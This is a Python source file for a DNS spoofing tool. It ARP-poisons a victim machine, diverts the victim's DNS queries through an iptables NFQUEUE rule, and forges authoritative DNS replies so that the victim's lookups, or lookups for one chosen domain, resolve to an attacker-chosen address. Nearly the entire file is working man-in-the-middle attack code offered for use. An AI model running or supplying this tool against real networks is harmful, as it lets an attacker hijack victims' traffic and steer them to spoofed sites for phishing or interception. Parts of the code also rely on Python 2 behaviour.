# ========================================================================
# File:         spoof.py
# Authors:      Ilyas LATRACH
# Date:         Sep 2021
# Functions:    parse()     -   Function which handles every packet that
#                               matches the iptables rule
#               main()      -   Main loop of spoof.py. Initializes ARP
#                               poisoning and DNS spoofing
#
# Description:
#   The main file of the Python-DNS-Spoofer. It ensures that the current
#   user has root access then begins ARP poisoning a target machine given
#   by the victim IP. We handle incoming packets by directing all packets
#   with the UDP destination port 53 on the prerouting table to NFQUEUE,
#   which is bound to our parse() function that determines whether it
#   needs to be spoofed.
# ========================================================================
import os
import argparse
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from poison import *
from netfilterqueue import NetfilterQueue
from scapy.all import *
from multiprocessing import Process


# ========================================================================
# Function: parse()
# Input:    packet      - Data packet that matched the iptables rule
# Desc.:    Function which retrieves information from a given packet and
#           check if it's a DNSQR packet. Any packet that isn't is simply
#           forwarded on by calling the accept() method. This function
#           also supports specific domain spoofing and will automatically
#           ignore any DNS packets that doesn't match a specific domain
#           name.
#           For all the packets that do match the conditions, a response
#           is crafted for the victim machine and the payload of the
#           packet is set to the spoofed packet we created then forwarded
#           back to the victim.
# ========================================================================
def parse(packet):
    pkt = IP(packet.get_payload())
    if not pkt.haslayer(DNSQR):
        packet.accept()
        return

    if(args.domain is not None):
        if(args.domain not in pkt[DNS].qd.qname):
            packet.accept()
            return

    spkt = (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
            UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /
            DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
            an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=args.redirect)))

    print("Redirecting {} to {}".format(pkt[DNS].qd.qname, args.redirect))
    packet.set_payload(str(spkt))
    packet.accept()


# ========================================================================
# Function: main()
# Input:    None
# Return:   None
# Desc.:    Main function and loop of spoof.py. Does a simple root check,
#           then initializes ARP poisoning on a seperate process. The
#           iptables rule is created at the start and removed when the
#           program ends via KeyboardInterrupt. The NetfilterQueue simply
#           continues to run and waits for incoming packets that matches
#           the iptables rule and queues all the matching packets to be
#           individually processed.
# ========================================================================
def main():
    # Root check
    if(os.getuid() != 0):
        exit("This program must be run with root/sudo")

    # Initialize new process for ARP poisoning
    arp_poison = Process(target=ArpPoison, args=(args.ip, args.router, args.iface))
    arp_poison.start()

    # Create iptables rule to forward prerouting to NFQUEUE
    os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
    # Initialize nfqueue and bind to parse function
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, parse)

    # Main loop
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print("Interrupt Signal received, shutting down...")
        nfqueue.unbind()
        arp_poison.join()
        os.system('iptables -t nat -F')


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="Victim IP address")
    parser.add_argument("redirect", help="Address to redirect to")
    parser.add_argument("-d", "--domain", help="Domain to spoof")
    parser.add_argument("-i", "--iface", help="Interface to watch")
    parser.add_argument("-r", "--router", help="Router IP address")
    args = parser.parse_args()
    if(args.iface is None):
        args.iface = "eno1"
    main()
